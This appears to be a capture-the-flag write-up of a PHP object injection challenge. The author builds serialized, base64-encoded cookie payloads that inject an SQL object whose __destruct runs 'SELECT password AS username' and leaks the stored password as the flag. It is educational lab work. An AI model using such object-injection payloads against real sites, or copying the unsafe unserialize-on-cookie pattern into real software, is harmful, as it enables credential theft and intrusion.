@@ -1,0 +1,139 @@
+There's 2 pieces to this one, first source1.php instantiates an SQL connection:
+
+	$sql = new SQL();
+	$sql->connect();
+	$sql->query = 'SELECT username FROM users WHERE id=';
+
+Then it does some operations on the leet_hax0r cookie:
+
+	if (isset ($_COOKIE['leet_hax0r'])) {
+### $sess_data set to decoded cookie info
+	    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
+	    try {
+### IP field in the cookie is getting checked against remote addr, not sure about this line
+	        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
+	            die('CANT HACK US!!!');
+	        }
+	    } catch(Exception $e) {
+	        echo $e;
+	    }
+	} else {
+### Set default cookie values to be returned to the client (presumably)
+	    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
+	    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
+	}
+
+### The sql query runs based on the $_REQUEST['id'] variable... what does this have to do with the leet cookie?
+ 
+	if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
+	    try {
+	        $sql->query .= $_REQUEST['id'];
+	    } catch(Exception $e) {
+	        echo ' Invalid query';
+	    }
+	}
+
+Also, it's worth noting that the man page on unserialize() states:
+	""
+	Warning:
+	Do not pass untrusted user input to unserialize() regardless of the options value of allowed_classes. Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json_decode() and json_encode()) if you need to pass serialized data to the user. 
+	""
+
+Also, according to OWASP's website:
+	""
+	In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:
+    The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a "POP chain".
+    All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.
+	""
+
+Alright so the cookie contains the REMOTE_ADDR IP and a time stamp. Let's see what that looks like when I type 1 for the query field:
+	""
+	Cookie	leet_hax0r	YToxOntzOjI6ImlwIjtzOjEzOiI3My4xNTMuMjAuMTM5Ijt9
+	Body	id	1
+	Body	submit	Go
+	""
+In the html form we also get: "Username: flag"
+
+Let's see what that leet haxor stuff is. According to the php first it's base64 decode, then it's unserialized:
+
+$ php -a
+Interactive shell
+
+php > $data = unserialize (base64_decode ('YToxOntzOjI6ImlwIjtzOjEzOiI3My4xNTMuMjAuMTM5Ijt9'));
+php > var_dump($data);
+array(1) {
+  ["ip"]=>
+  string(13) "73.153.20.139"
+}
+
+Cool, now we know the vulnerability is in the unseriazlize() call and what kind of data goes in the cookie.
+As a quick spot check let's try to hit that "die('CANT HACK US!!!');" line
+
+$ php -a
+Interactive shell
+
+php > $array = array(
+php ( "ip" => "74.153.21.140"
+php ( );
+php > $encoded = base64_encode(serialize($array));
+php > echo $encoded;
+YToxOntzOjI6ImlwIjtzOjEzOiI3NC4xNTMuMjEuMTQwIjt9
+
+Now I pop that string in the leet_hax0r cookie and the page returned CANT HACK US!!! This also happens if you change the key to something else than 'ip'. Awesome.
+
+Now let's take a look at the magic __destruct() method:
+
+    public function __destruct() {
+        if (!isset ($this->conn)) {
+            $this->connect ();
+        }
+        
+        $ret = $this->execute ();
+        if (false !== $ret) {    
+            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
+                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
+            }
+        }
+    }
+
+This will execute whatever the query is at the end of the script's execution. Everything before it is there to build the query and try to sanitize input. I'm going to try to reinstanciate a new SQL() class which will have a query string that displays the password as well as the username. I should be created when unserialize() is called.
+
+
+Here's what I tried and failed at:
+
+$ php -a
+Interactive shell
+
+php > class SQL {
+php { public $query = 'SELECT password FROM users WHERE id=';
+php { }
+php > print base64_encode(serialize(new SQL));
+TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6MzY6IlNFTEVDVCBwYXNzd29yZCBGUk9NIHVzZXJzIFdIRVJFIGlkPSI7fQ==
+php > $array = array(
+php ( "ip" => "73.153.20.139",
+php ( "inj" => new SQL,
+php ( );
+php > var_dump($array);
+array(2) {
+  ["ip"]=>
+  string(13) "73.153.20.139"
+  ["inj"]=>
+  object(SQL)#1 (1) {
+    ["query"]=>
+    string(36) "SELECT password FROM users WHERE id="
+  }
+}
+php > $encoded = base64_encode(serialize($array));
+php > echo $encoded;
+YToyOntzOjI6ImlwIjtzOjEzOiI3My4xNTMuMjAuMTM5IjtzOjM6ImluaiI7TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6MzY6IlNFTEVDVCBwYXNzd29yZCBGUk9NIHVzZXJzIFdIRVJFIGlkPSI7fX0=
+
+=========== PAUSE ===============
+My issue was that I was only declaring part of the SQL object; and the query above was not the right one.
+Here's what I did:
+	1) Copied the whole SQL class declaration (as shown in the source file) into a php file.
+	2) Did the same serialization routine as above: instanciated the new object into an array with an additional record containing an "ip" K/V pair, then serialize() and base64_encode().
+	3) Since I copied the whole class and that the garbage collection is calling the __destruct() method (the one that ouputs the html displayed client side) I figured I could fiddle with the field being outputted. Little did I know that calling new SQL() only creates an object with the two fields ($query, $conn) and doesn't carry the __destruct I wrote locally up to the server. That's annoying, the only field I can display has to be called 'username'.
+	4) Finally I solved the problem by hardcoding the following query into my local SQL class:
+		'SELECT password AS username FROM users WHERE id=1'
+
+The flag got displayed on the client side as "Username: WEBSEC{...}"
